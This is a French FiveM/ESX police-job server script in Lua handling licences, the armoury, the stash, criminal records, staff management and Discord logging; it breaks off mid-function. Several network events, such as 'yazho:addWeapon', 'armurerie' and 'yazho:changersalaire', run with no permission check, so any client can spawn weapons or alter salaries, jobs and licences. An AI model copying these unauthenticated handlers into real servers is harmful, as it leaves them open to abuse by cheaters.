ESX = nil

if Config.ESextendedLegacy == true then
	ESX = exports["es_extended"]:getSharedObject()
else
	TriggerEvent("esx:getSharedObject", function(obj) ESX = obj end)
end


TriggerEvent('esx_society:registerSociety', Config.JobName, 'Police', Config.SocietyName, Config.SocietyName, Config.SocietyName, {type = 'public'})

ESX.RegisterServerCallback('yazhopermis:getAllLicenses', function(source, cb, target)
    local xPlayer = ESX.GetPlayerFromId(target)
        local allLicenses = {}
        MySQL.Async.fetchAll('SELECT * FROM user_licenses WHERE owner = @owner', {['owner'] = xPlayer.identifier}, function(result)
            for k,v in pairs(result) do
                table.insert(allLicenses, {
                    Name = xPlayer.getName(),
                    Type = v.type,
                    Point = v.point,
                    Owner = v.owner
                })
            end
        cb(allLicenses)
    end)
end)

RegisterServerEvent('yazhopermis:removePoint')
AddEventHandler('yazhopermis:removePoint', function(permis, qty, owner)
    local _src = source
    local xPlayer = ESX.GetPlayerFromId(_src)
    MySQL.Async.fetchAll('SELECT * FROM user_licenses WHERE type = @type AND owner = @owner', {['type'] = permis, ['owner'] = owner}, function(result)
    MySQL.Async.execute('DELETE FROM user_licenses WHERE owner = @owner AND type = @type', {['type'] = permis, ['owner'] = owner})
    TriggerClientEvent('esx:showNotification', _src, "La licence de "..ESX.GetPlayerFromIdentifier(owner).getName().." a bien été retiré.")
	logsdisc("```"..xPlayer.getName().." a retiré la licence de "..ESX.GetPlayerFromIdentifier(owner).getName().."```", Config.logs.GestionPermis)
end)
end)

RegisterNetEvent('equipementbase')
AddEventHandler('equipementbase', function()
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)

    xPlayer.addWeapon('WEAPON_NIGHTSTICK', 999)
    xPlayer.addWeapon('WEAPON_STUNGUN', 999)
    xPlayer.addWeapon('WEAPON_FLASHLIGHT', 999)
    TriggerClientEvent('esx:showNotification', source, "Vous avez reçu votre équipement.")
end)

RegisterNetEvent('yazho:addWeapon')
AddEventHandler('yazho:addWeapon', function(weaponName, ammo)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    
    if xPlayer then
        xPlayer.addWeapon(weaponName, ammo)
        TriggerClientEvent('esx:showNotification', _source, 'Vous avez reçu votre arme.')
    else
        print('Erreur : joueur introuvable pour l’ID ' .. tostring(_source))
    end
end)

RegisterNetEvent('armurerie')
AddEventHandler('armurerie', function(arme, prix)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)

	if Config.armesEnItems then
		xPlayer.addInventoryItem(arme, 1)
	else
        xPlayer.addWeapon(arme, 999)
	end
    TriggerClientEvent('esx:showNotification', source, "Vous avez reçu votre arme.")
	logsdisc("```"..xPlayer.getName().." a reçu une "..arme..".```", Config.logs.Armurerie)
end)

RegisterNetEvent('rmvarmurerie')
AddEventHandler('rmvarmurerie', function(arme, prix)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)

	if Config.armesEnItems then
		xPlayer.removeInventoryItem("weapon_pistol", 1)
		xPlayer.removeInventoryItem("weapon_pumpshotgun_mk2", 1)
		xPlayer.removeInventoryItem("weapon_carbinerifle", 1)
	else
		xPlayer.removeInventoryItem("weapon_pistol", 1)
		xPlayer.removeInventoryItem("weapon_pumpshotgun_mk2", 1)
		xPlayer.removeInventoryItem("weapon_carbinerifle", 1)
	end
    TriggerClientEvent('esx:showNotification', source, "Vous avez rendu vos armes.")
end)

RegisterServerEvent("clearPlayerLoadout")
AddEventHandler("clearPlayerLoadout", function(playerId)
    local xPlayer = ESX.GetPlayerFromId(playerId)
    if xPlayer then
        local weapons = xPlayer.getLoadout()
        for _, weapon in ipairs(weapons) do
            xPlayer.removeWeapon(weapon.name)
        end
    end
end)

ESX.RegisterServerCallback('yazhopolice:getVehicleInfos', function(source, cb, plate)

	MySQL.Async.fetchAll('SELECT owner FROM owned_vehicles WHERE plate = @plate', {
		['@plate'] = plate
	}, function(result)
		local retrivedInfo = {
			plate = plate
		}
		if result[1] then
			MySQL.Async.fetchAll('SELECT firstname, lastname FROM users WHERE identifier = @identifier',  {
				['@identifier'] = result[1].owner
			}, function(result2)
				if Config.EnableESXIdentity then
					retrivedInfo.owner = result2[1].firstname .. ' ' .. result2[1].lastname
				else
					retrivedInfo.owner = result2[1].name
				end
				cb(retrivedInfo)
			end)
		else
			cb(retrivedInfo)
		end
	end)
end)

ESX.RegisterServerCallback('yazhopolice:getStockItems', function(source, cb)
	TriggerEvent('esx_addoninventory:getSharedInventory', Config.SocietyName, function(inventory)
		cb(inventory.items)
	end)
end)

RegisterNetEvent('yazhopolice:getStockItem')
AddEventHandler('yazhopolice:getStockItem', function(itemName, count)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)

	TriggerEvent('esx_addoninventory:getSharedInventory', Config.SocietyName, function(inventory)
		local inventoryItem = inventory.getItem(itemName)

		if count > 0 and inventoryItem.count >= count then
				inventory.removeItem(itemName, count)
				xPlayer.addInventoryItem(itemName, count)
				TriggerClientEvent('esx:showNotification', _source, 'Objet retiré.', count, inventoryItem.label)
				logsdisc("```"..xPlayer.getName().." a retiré "..count.." "..inventoryItem.label.." du coffre.```", Config.logs.CoffreObjets)
		else
			TriggerClientEvent('esx:showNotification', _source, "~r~Quantité Invalide.")
		end
	end)
end)

RegisterNetEvent('yazhopolice:putStockItems')
AddEventHandler('yazhopolice:putStockItems', function(itemName, count)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local sourceItem = xPlayer.getInventoryItem(itemName)

	TriggerEvent('esx_addoninventory:getSharedInventory', Config.SocietyName, function(inventory)
		local inventoryItem = inventory.getItem(itemName)

		if sourceItem.count >= count and count > 0 then
			xPlayer.removeInventoryItem(itemName, count)
			inventory.addItem(itemName, count)
			TriggerClientEvent('esx:showNotification', _source, "Objet déposé.")
			logsdisc("```"..xPlayer.getName().." a déposé "..count.." "..inventoryItem.label.." dans le coffre.```", Config.logs.CoffreObjets)
		else
			TriggerClientEvent('esx:showNotification', _source, "~r~Quantité Invalide.")
		end
	end)
end)

ESX.RegisterServerCallback('yazhopolice:getPlayerInventory', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local items   = xPlayer.inventory

	cb({items = items})
end)

RegisterServerEvent('police:PriseEtFinservice')
AddEventHandler('police:PriseEtFinservice', function(PriseOuFin)
	local _source = source
	local _raison = PriseOuFin
	local xPlayer = ESX.GetPlayerFromId(_source)
	local xPlayers = ESX.GetPlayers()
	local identifier = GetPlayerIdentifier(_source)
	local name = xPlayer.getName(_source)

	for i = 1, #xPlayers, 1 do
		local thePlayer = ESX.GetPlayerFromId(xPlayers[i])
		if thePlayer.job.name == 'police' then
			TriggerClientEvent('police:InfoService', xPlayers[i], _raison, name)
		end
	end
end)

RegisterServerEvent('renfort')
AddEventHandler('renfort', function(coords, raison)
	local _source = source
	local _raison = raison
	local xPlayer = ESX.GetPlayerFromId(_source)
	local xPlayers = ESX.GetPlayers()

	for i = 1, #xPlayers, 1 do
		local thePlayer = ESX.GetPlayerFromId(xPlayers[i])
		if thePlayer.job.name == 'police' then
			TriggerClientEvent('renfort:setBlip', xPlayers[i], coords, _raison)
		end
	end
end)

RegisterCommand('lspd', function(source, args, rawCommand)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    if xPlayer.job.name == "police" then
        local src = source
        local msg = rawCommand:sub(5)
        local args = msg
        if player ~= false then
            local name = GetPlayerName(source)
            local xPlayers	= ESX.GetPlayers()
        for i=1, #xPlayers, 1 do
            local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
			TriggerClientEvent('esx:showAdvancedNotification', xPlayers[i], 'Police', 'Annonce(s)', msg, 'CHAR_CALL911', 1)
        end
    else
        TriggerClientEvent('esx:showNotification', "~r~Tu n'es pas policier.")
    end
    else
        TriggerClientEvent('esx:showNotification', "~r~Tu n'es pas policier.")
    end
 end, false)

RegisterServerEvent('yazhopolice:handcuff')
AddEventHandler('yazhopolice:handcuff', function(target)
  TriggerClientEvent('yazhopolice:handcuff', target)
end)

RegisterServerEvent('yazhopolice:drag')
AddEventHandler('yazhopolice:drag', function(target)
  local _source = source
  TriggerClientEvent('yazhopolice:drag', target, _source)
end)

RegisterServerEvent('yazhopolice:putInVehicle')
AddEventHandler('yazhopolice:putInVehicle', function(target)
  TriggerClientEvent('yazhopolice:putInVehicle', target)
end)

RegisterServerEvent('yazhopolice:OutVehicle')
AddEventHandler('yazhopolice:OutVehicle', function(target)
    TriggerClientEvent('yazhopolice:OutVehicle', target)
end)

ESX.RegisterServerCallback('getPlayerInventory', function(source, cb, target)
    local xPlayer = ESX.GetPlayerFromId(target)

    if xPlayer then
        cb({
            items = xPlayer.inventory,
            weapons = xPlayer.loadout
        })
    else
        cb(nil)
    end
end)

ESX.RegisterServerCallback('getPlayerInventory', function(source, cb, target)
    local xPlayer = ESX.GetPlayerFromId(target)

    if xPlayer then
        local inventoryData = {
            items = xPlayer.inventory,
            weapons = xPlayer.loadout
        }
        
        print("Données récupérées pour l'inventaire du joueur: ", json.encode(inventoryData))
        cb(inventoryData)
    else
        print("Aucun joueur trouvé avec l'ID: ", target)
        cb(nil)
    end
end)

ESX.RegisterServerCallback('yazhopolice:getOtherPlayerData', function(source, cb, target, notify)
    local xPlayer = ESX.GetPlayerFromId(target)
    TriggerClientEvent("esx:showNotification", target, "~r~Quelqu'un vous fouille.")
	logsdisc("```"..xPlayer.getName().." se fait fouiller.```", Config.logs.Fouille)
    if xPlayer then
        local data = {
            name = xPlayer.getName(),
            job = xPlayer.job.label,
            grade = xPlayer.job.grade_label,
            inventory = xPlayer.getInventory(),
            accounts = xPlayer.getAccounts(),
            weapons = xPlayer.getLoadout(),
        }
        TriggerEvent('esx_license:getLicenses', target, function(licenses)
                 print(json.encode(licenses))
                data.licenses = licenses
        cb(data)
        end)
    end
end)

RegisterNetEvent("yazho:adrGet")
AddEventHandler("yazho:adrGet", function()
    local _src = source
    local table = {}
    MySQL.Async.fetchAll('SELECT * FROM adr', {}, function(result)
        for k,v in pairs(result) do
            table[v.id] = v
        end
        TriggerClientEvent("yazho:adrGet", _src, table)
    end)
end)

RegisterNetEvent("yazho:adrDel")
AddEventHandler("yazho:adrDel", function(id)
    local _src = source

    MySQL.Async.execute('DELETE FROM adr WHERE id = @id',
    { ['id'] = id },
    function(affectedRows)
        TriggerClientEvent("yazho:adrDel", _src)
		logsdisc("```"..GetPlayerName(_src).." a supprimé un avis de recherche.```", Config.logs.AvisDeRecherche)
    end
    )
end)

RegisterNetEvent("yazho:adrAdd")
AddEventHandler("yazho:adrAdd", function(builder)
    local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	local name = xPlayer.getName(_src)
    local date = os.date("*t", os.time()).day.."/"..os.date("*t", os.time()).month.."/"..os.date("*t", os.time()).year.." à "..os.date("*t", os.time()).hour.."h"..os.date("*t", os.time()).min
    MySQL.Async.execute('INSERT INTO adr (author,date,firstname,lastname,reason,dangerosity) VALUES (@a,@b,@c,@d,@e,@f)',

    { 
        ['a'] = name,
        ['b'] = date,
        ['c'] = builder.firstname,
        ['d'] = builder.lastname,
        ['e'] = builder.reason,
        ['f'] = builder.dangerosity
    },


    function(affectedRows)
        TriggerClientEvent("yazho:adrAdd", _src)
		logsdisc("```"..name.." a ajouté un avis de recherche à "..builder.firstname.." "..builder.lastname.." pour la raison suivante : "..builder.reason.."```", Config.logs.AvisDeRecherche)
    end
    )
end)

RegisterNetEvent("yazho:cjGet")
AddEventHandler("yazho:cjGet", function()
    local _src = source
    local table = {}
    MySQL.Async.fetchAll('SELECT * FROM cj', {}, function(result)
        for k,v in pairs(result) do
            table[v.id] = v
        end
        TriggerClientEvent("yazho:cjGet", _src, table)
    end)
end)

RegisterNetEvent("yazho:cjDel")
AddEventHandler("yazho:cjDel", function(id)
    local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
    MySQL.Async.execute('DELETE FROM cj WHERE id = @id',
    { ['id'] = id },
    function(affectedRows)
        TriggerClientEvent("yazho:cjDel", _src)
		logsdisc("```"..xPlayer.getName().." a supprimé un casier judiciaire.```", Config.logs.Casier)
    end
    )
end)

RegisterNetEvent("yazho:cjAdd")
AddEventHandler("yazho:cjAdd", function(builder)
    local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	local name = xPlayer.getName(_src)
    local date = os.date("*t", os.time()).day.."/"..os.date("*t", os.time()).month.."/"..os.date("*t", os.time()).year.." à "..os.date("*t", os.time()).hour.."h"..os.date("*t", os.time()).min
    MySQL.Async.execute('INSERT INTO cj (author,date,firstname,lastname,reason) VALUES (@a,@b,@c,@d,@e)',

    { 
        ['a'] = name,
        ['b'] = date,
        ['c'] = builder.firstname,
        ['d'] = builder.lastname,
        ['e'] = builder.reason
    },

    function(affectedRows)
        TriggerClientEvent("yazho:cjAdd", _src)
		logsdisc("```"..name.." a ajouté un casier judiciaire à "..builder.firstname.." "..builder.lastname.." pour "..builder.reason..".```", Config.logs.Casier)
    end
    )
end)

RegisterNetEvent("yazho:cjModify")
AddEventHandler("yazho:cjModify", function(builder, id, newreason)
    local _src = source

	MySQL.Async.execute('UPDATE cj SET reason = @reason WHERE id = @id', {
		['@id'] = id,
		['@reason'] = builder.newreason
	},
    function(affectedRows)
        TriggerClientEvent("yazho:cjModify", _src)
    end
	)
end)

RegisterNetEvent("genius:sendcall")
AddEventHandler("genius:sendcall", function()

	local xPlayers = ESX.GetPlayers()
	for i = 1, #xPlayers, 1 do
		local thePlayer = ESX.GetPlayerFromId(xPlayers[i])
		if thePlayer.job.name == 'police' then
			TriggerClientEvent('esx:showNotification', xPlayers[i], "Un Citoyen demande un agent de police au commissariat.")
			logsdisc("```Un citoyen a demandé un agent de police au commissariat.```", Config.logs.AcceuilPolice)
		end
	end
end)

function sendToDiscordWithSpecialURL (name,message,color,url)
    local DiscordWebHook = url
	local embeds = {
		{
			["title"]=message,
			["type"]="rich",
		}
	}
    if message == nil or message == '' then return FALSE end
    PerformHttpRequest(DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({ username = name,embeds = embeds}), { ['Content-Type'] = 'application/json' })
end


RegisterNetEvent("genius:sendplainte")
AddEventHandler("genius:sendplainte", function(lastname, firstname,phone, subject, desc)

	local xPlayers = ESX.GetPlayers()
	for i = 1, #xPlayers, 1 do
		local thePlayer = ESX.GetPlayerFromId(xPlayers[i])
		if thePlayer.job.name == 'police' then
			TriggerClientEvent('esx:showNotification', xPlayers[i], "Une plainte a été déposée.")
		end
	end
	sendToDiscordWithSpecialURL("LOGS","Plainte de : '{"..lastname.." "..firstname.. "}' \nNuméro de Téléphone : "..phone.."\nSujet : "..subject.."\nPlainte : "..desc, 2061822, Config.logs.AcceuilPolice)
end)

RegisterServerEvent('patron:recruter')
AddEventHandler('patron:recruter', function(societe, job2, target)

  local xPlayer = ESX.GetPlayerFromId(source)
  local xTarget = ESX.GetPlayerFromId(target)

  
  if job2 == false then
  	if xPlayer.job.grade_name == 'boss' then
  	xTarget.setJob(societe, 0)
  	TriggerClientEvent('esx:showNotification', xPlayer.source, "Le joueur a été recruté.")
  	TriggerClientEvent('esx:showNotification', target, "Bienvenue chez la police.")
	  logsdisc("```"..xPlayer.getName().." a recruté "..xTarget.getName()..".```", Config.logs.Boss)
  	else
	TriggerClientEvent('esx:showNotification', xPlayer.source, "Vous n'avez pas les permissions nécessaires.")
end
  else
  	if xPlayer.job2.grade_name == 'boss' then
  	xTarget.setJob2(societe, 0)
  	TriggerClientEvent('esx:showNotification', xPlayer.source, "Le joueur a été recruté.")
  	TriggerClientEvent('esx:showNotification', target, "Bienvenue chez la police.")
	  logsdisc("```"..xPlayer.getName().." a recruté "..xTarget.getName()..".```", Config.logs.Boss)
  	else
	TriggerClientEvent('esx:showNotification', xPlayer.source, "Vous n'avez pas les permissions nécessaires.")
end
  end
end)

RegisterServerEvent('patron:promouvoir')
AddEventHandler('patron:promouvoir', function(societe, job2, target)

  local xPlayer = ESX.GetPlayerFromId(source)
  local xTarget = ESX.GetPlayerFromId(target)

  
  if job2 == false then
  	if xPlayer.job.grade_name == 'boss' and xPlayer.job.name == xTarget.job.name then
  	xTarget.setJob(societe, tonumber(xTarget.job.grade) + 1)
  	TriggerClientEvent('esx:showNotification', xPlayer.source, "Le joueur a été promu.")
  	TriggerClientEvent('esx:showNotification', target, "Vous avez été promu.")
	  logsdisc("```"..xPlayer.getName().." a promu "..xTarget.getName()..".```", Config.logs.Boss)
  	else
	TriggerClientEvent('esx:showNotification', xPlayer.source, "Vous n'avez pas les permissions nécessaires.")
end
  else
  	if xPlayer.job2.grade_name == 'boss' and xPlayer.job2.name == xTarget.job2.name then
  	xTarget.setJob2(societe, tonumber(xTarget.job2.grade) + 1)
  	TriggerClientEvent('esx:showNotification', xPlayer.source, "Le joueur a été promu.")
  	TriggerClientEvent('esx:showNotification', target, "Vous avez été promu.")
	  logsdisc("```"..xPlayer.getName().." a promu "..xTarget.getName()..".```", Config.logs.Boss)
  	else
	TriggerClientEvent('esx:showNotification', xPlayer.source, "Vous n'avez pas les permissions nécessaires.")
end
  end
end)

RegisterServerEvent('patron:descendre')
AddEventHandler('patron:descendre', function(societe, job2, target)

  local xPlayer = ESX.GetPlayerFromId(source)
  local xTarget = ESX.GetPlayerFromId(target)

  
  if job2 == false then
  	if xPlayer.job.grade_name == 'boss' and xPlayer.job.name == xTarget.job.name then
  	xTarget.setJob(societe, tonumber(xTarget.job.grade) - 1)
  	TriggerClientEvent('esx:showNotification', xPlayer.source, "Le joueur a été rétrogradé.")
  	TriggerClientEvent('esx:showNotification', target, "Vous avez été rétrogradé de "..societe..".")
	  logsdisc("```"..xPlayer.getName().." a rétrogradé "..xTarget.getName()..".```", Config.logs.Boss)
  	else
	TriggerClientEvent('esx:showNotification', xPlayer.source, "Vous n'avez pas les permissions nécessaires.")
end
  else
  	if xPlayer.job2.grade_name == 'boss' and xPlayer.job2.name == xTarget.job2.name then
  	xTarget.setJob2(societe, tonumber(xTarget.job2.grade) - 1)
  	TriggerClientEvent('esx:showNotification', xPlayer.source, "Le joueur a été rétrogradé.")
  	TriggerClientEvent('esx:showNotification', target, "Vous avez été rétrogradé de "..societe..".")
	  logsdisc("```"..xPlayer.getName().." a rétrogradé "..xTarget.getName()..".```", Config.logs.Boss)
  	else
	TriggerClientEvent('esx:showNotification', xPlayer.source, "Vous n'avez pas les permissions nécessaires.")
end
  end
end)

RegisterServerEvent('patron:virer')
AddEventHandler('patron:virer', function(societe, job2, target)

  local xPlayer = ESX.GetPlayerFromId(source)
  local xTarget = ESX.GetPlayerFromId(target)

  
  if job2 == false then
  	if xPlayer.job.grade_name == 'boss' and xPlayer.job.name == xTarget.job.name then
  	xTarget.setJob("unemployed", 0)
  	TriggerClientEvent('esx:showNotification', xPlayer.source, "Le joueur a été viré.")
  	TriggerClientEvent('esx:showNotification', target, "Vous avez été viré de "..societe..".")
	  logsdisc("```"..xPlayer.getName().." a viré "..xTarget.getName()..".```", Config.logs.Boss)
  	else
	TriggerClientEvent('esx:showNotification', xPlayer.source, "Vous n'avez pas les permissions nécessaires.")
end
  else
  	if xPlayer.job2.grade_name == 'boss' and xPlayer.job2.name == xTarget.job2.name then
  	xTarget.setJob2("unemployed2", 0)
  	TriggerClientEvent('esx:showNotification', xPlayer.source, "Le joueur a été viré.")
  	TriggerClientEvent('esx:showNotification', target, "Vous avez été viré de "..societe..".")
	  logsdisc("```"..xPlayer.getName().." a viré "..xTarget.getName()..".```", Config.logs.Boss)
  	else
	TriggerClientEvent('esx:showNotification', xPlayer.source, "Vous n'avez pas les permissions nécessaires.")
end
  end
end)

ESX.RegisterServerCallback('five_patron:listesalaire', function(source, cb, job)
	local xPlayer = ESX.GetPlayerFromId(source)
	local listegens = {}
  
	MySQL.Async.fetchAll('SELECT * FROM job_grades WHERE job_name = @job', {
	  ['@job'] = job
	}, function(result)
	  for i = 1, #result, 1 do
		table.insert(listegens, {
		  salaire = result[i].salary,
		  nom = result[i].label,
		  id = result[i].id
		})
	  end
  
	  cb(listegens)
	end)
  end)
  
  RegisterServerEvent('yazho:changersalaire')
  AddEventHandler('yazho:changersalaire', function (id, salaire)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
  
  
	MySQL.Async.execute(
	  'UPDATE job_grades SET salary = @salaire WHERE id = @id',
	  {
		['@salaire'] = salaire,
		['@id'] = id
	  }
	)
	
end)
  
  ESX.RegisterServerCallback('five_patron:listegensjob1', function(source, cb, job)
	local xPlayer = ESX.GetPlayerFromId(source)
	local listegens = {}
  
	MySQL.Async.fetchAll('SELECT * FROM users WHERE job = @job', {
	  ['@job'] = job
	}, function(result)
	  for i = 1, #result, 1 do
		table.insert(listegens, {
		  prenom = result[i].firstname,
		  nom = result[i].lastname,
		  steam = result[i].identifier
		})
	  end
  
	  cb(listegens)
	end)
  end)
  

  
RegisterServerEvent('yazho:virersql')
AddEventHandler('yazho:virersql', function (identifier)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)

	MySQL.Async.execute(
		'UPDATE users SET job = @job WHERE identifier = @identifier',
		{
		['@identifier'] = identifier,
		['@job'] = "unemployed"
	})
end)

ESX.RegisterServerCallback('yazho:getSocietyMoney', function(source, cb, societyName)
	if societyName ~= nil then
	  local society = "society_"..societyName
	  TriggerEvent('esx_addonaccount:getSharedAccount', society, function(account)
		cb(account.money)
	  end)
	else
	  cb(0)
	end
end)

RegisterServerEvent('add:addlic')
AddEventHandler('add:addlic', function(target, permis)
	local xPlayer = ESX.GetPlayerFromId(source)
	local xTarget = ESX.GetPlayerFromId(target)

    MySQL.Async.execute('INSERT INTO user_licenses (type, owner) VALUES (@type, @owner)', {
        ['@type'] = permis,
        ['@owner'] = xTarget.identifier
    })
	
	logsdisc("```"..xPlayer.getName().." a ajouté une licence "..permis.." à "..xTarget.getName()..".```", Config.logs.Boss)
end)

RegisterServerEvent('sup:addlic')
AddEventHandler('sup:addlic', function(target, permis)
	local xPlayer = ESX.GetPlayerFromId(source)
  	local xTarget = ESX.GetPlayerFromId(target)

    MySQL.Async.execute('DELETE FROM user_licenses WHERE type = @type AND owner = @owner', {
        ['@type'] = permis,
        ['@owner'] = xTarget.identifier
    })

	logsdisc("```"..xPlayer.getName().." a supprimé une licence "..permis.." à "..xTarget.getName()..".```", Config.logs.Boss)
end)

ESX.RegisterServerCallback('yazho:getVehGarage', function(source, cb, carName)
	MySQL.Async.fetchAll("SELECT * FROM stockpolice WHERE type = @type AND model = @model", {['@type'] = "car", ['@model'] = carName}, function(data)
        cb(#data)
    end)
end)

RegisterServerEvent('yazho:addVehInGarage')
AddEventHandler('yazho:addVehInGarage', function(carName)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	if xPlayer.job.name == 'police' then
		MySQL.Async.execute('INSERT INTO stockpolice (type, model) VALUES (@type, @model)', {
			['@type'] = "car",
			['@model'] = carName
		})


		logsdisc("```"..xPlayer.getName().." a ajouté un véhicule "..carName.." au garage.```", Config.logs.Boss)
	end
end)

RegisterServerEvent('yazho:removeVehInGarage')
AddEventHandler('yazho:removeVehInGarage', function(carName)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	if xPlayer.job.name == 'police' then
	    MySQL.Async.fetchAll("SELECT * FROM stockpolice WHERE type = @type AND model = @model", {['@type'] = "car", ['@model'] = carName}, function(data)
		MySQL.Async.execute('DELETE FROM stockpolice WHERE type = @type AND model = @model AND id = @id', {
			['@id'] = data[1].id,
			['@type'] = "car",
			['@model'] = carName
		})
		end)

		logsdisc("```"..xPlayer.getName().." a supprimé un véhicule "..carName.." du garage.```", Config.logs.Boss)
    end
end)

ESX.RegisterServerCallback('yazho:getWeaponAmmu', function(source, cb, weaponName)
	MySQL.Async.fetchAll("SELECT * FROM stockpolice WHERE type = @type AND model = @model", {['@type'] = "weapon", ['@model'] = weaponName}, function(data)
        cb(#data)
    end)
end)

RegisterServerEvent('yazho:addWeaponInAmmu')
AddEventHandler('yazho:addWeaponInAmmu', function(weaponName)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	if xPlayer.job.name == 'police' then
		MySQL.Async.execute('INSERT INTO stockpolice (type, model) VALUES (@type, @model)', {
			['@type'] = "weapon",
			['@model'] = weaponName
		})

		logsdisc("```"..xPlayer.getName().." a ajouté une arme "..weaponName.." à l'armurerie.```", Config.logs.Boss)
	end
end)

RegisterServerEvent('yazho:removeWeaponInAmmu')
AddEventHandler('yazho:removeWeaponInAmmu', function(weaponName)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	if xPlayer.job.name == 'police' then
	    MySQL.Async.fetchAll("SELECT * FROM stockpolice WHERE type = @type AND model = @model", {['@type'] = "weapon", ['@model'] = weaponName}, function(data)
		MySQL.Async.execute('DELETE FROM stockpolice WHERE type = @type AND model = @model AND id = @id', {
			['@id'] = data[1].id,
			['@type'] = "weapon",
			['@model'] = weaponName
		})
		end)

		logsdisc("```"..xPlayer.getName().." a supprimé une arme "..weaponName.." de l'armurerie.```", Config.logs.Boss)
    end
end)


ESX.RegisterServerCallback('yazho:getMoneySociety', function(source, cb, priceCar)
	local societyAccount = nil
	TriggerEvent('esx_addonaccount:getSharedAccount', Config.SocietyName, function(account)
		societyAccount = account
	end)
	if societyAccount ~= nil then
		if societyAccount.money >= priceCar then
			societyAccount.removeMoney(priceCar)
			cb(true)
		else
			cb(false)
		end
	else
		cb(false)
	end
end)


ESX.RegisterServerCallback('yazho:getPlayer', function(source, cb, target)
	local _targetId = target
	local xTarget = ESX.GetPlayerFromId(_targetId)

	MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier = @identifier', {
            ['@identifier'] = xTarget.identifier
    }, function(result)

	local allInfo = {
		fullName = xTarget.getName(),
		cashMoney = xTarget.getMoney(),
		bankMoney = xTarget.getAccount('bank').money,
		job = xTarget.job.name,
		grade = xTarget.job.grade,
		dateAnniv = result[1].dateofbirth,
		firstname = result[1].firstname,
		lastname = result[1].lastname,
		numberTel = result[1].phone_number,
	}

	cb(allInfo)
	end)
end)


RegisterServerEvent('yazho:sendMsg')
AddEventHandler('yazho:sendMsg', function(title, msg)
	local xPlayers = ESX.GetPlayers()
    for i = 1, #xPlayers, 1 do
        local thePlayer = ESX.GetPlayerFromId(xPlayers[i])
        if thePlayer.job.name == 'police' then
			TriggerClientEvent('esx:showNotification', xPlayers[i], msg)
        end
    end
end)

local allPlayerInGAV = {}

RegisterNetEvent('yazho:addPlayerInGAV')
AddEventHandler('yazho:addPlayerInGAV', function(playerId)
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.job.name == 'police' then
        allPlayerInGAV[playerId] = true
        TriggerClientEvent('esx:showNotification', source, 'Joueur ajouté en G.A.V.')
    end
end)



RegisterNetEvent('yazho:removePlayerInGAV')
AddEventHandler('yazho:removePlayerInGAV', function(playerId)
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.job.name == 'police' then
        allPlayerInGAV[playerId] = nil
        TriggerClientEvent('esx:showNotification', source, 'Joueur retiré de la G.A.V.')
    end
end)


ESX.RegisterServerCallback('yazho:getAllPlayerInGAV', function(source, cb)
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.job.name == 'police' then
        local players = {}
        for playerId, _ in pairs(allPlayerInGAV) do
            table.insert(players, playerId)
        end
        cb(players)
    else
        cb({})
    end
end)


ESX.RegisterServerCallback('yazho:getAllPlayerInGAVForGAV', function(source, cb, target)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	if xPlayer.job.name == 'police' then
		if allPlayerInGAV[target] ~= nil then
			cb(true)
		else
			cb(false)
		end
	end
end)

RegisterServerEvent('heli:spotlight')
AddEventHandler('heli:spotlight', function(state)
	local serverID = source
	TriggerClientEvent('heli:spotlight', -1, serverID, state)
end)

ESX.RegisterServerCallback('yazhopolice:getEnosStatus', function(source, cb, id, statusName)
	local xPlayer = ESX.GetPlayerFromId(id)
	local status  = xPlayer.get('status')
	print(id)

	for i=1, #status, 1 do
			if status[i].name == statusName then
			cb(status[i])
			break
		end
	end
end)


ESX.RegisterServerCallback('yazho:getAllCasier', function(source, cb)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspd', {}, function(result)
		cb(result)
    end)
end)


ESX.RegisterServerCallback('yazho:getIfHaveCasier', function(source, cb)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspd WHERE owner = @owner', {['@owner'] = xPlayer.identifier}, function(result)
		if result[1] then
			cb(true)
		else
			cb(false)
		end
    end)
end)


RegisterServerEvent('yazho:addCasier')
AddEventHandler('yazho:addCasier', function(target)
	local _src = source
	local _target = target
	local xPlayer = ESX.GetPlayerFromId(_src)
	local xTarget = ESX.GetPlayerFromId(_target)
	if xPlayer.job.name == 'police' then
		MySQL.Async.fetchAll('SELECT * FROM casierlspd WHERE owner = @owner', {
        ['@owner'] = xTarget.identifier
    }, function(result)
        if result[1] then
            TriggerClientEvent('esx:showNotification', _src, "~r~"..xTarget.getName().." a déjà un casier.")
        else
            MySQL.Async.execute('INSERT INTO casierlspd (owner, name) VALUES (@owner, @name)', {
				['@owner'] = xTarget.identifier,
				['@name'] = xTarget.getName()
			})
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, name, amount) VALUES (@owner, @type, @name, @amount)', {
				['@owner'] = xTarget.identifier,
				['@type'] = "blackmoney",
				['@name'] = "Argent Sale",
				['@amount'] = 0
			})
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, name, amount) VALUES (@owner, @type, @name, @amount)', {
				['@owner'] = xTarget.identifier,
				['@type'] = "cash",
				['@name'] = "Argent Propre",
				['@amount'] = 0
			})
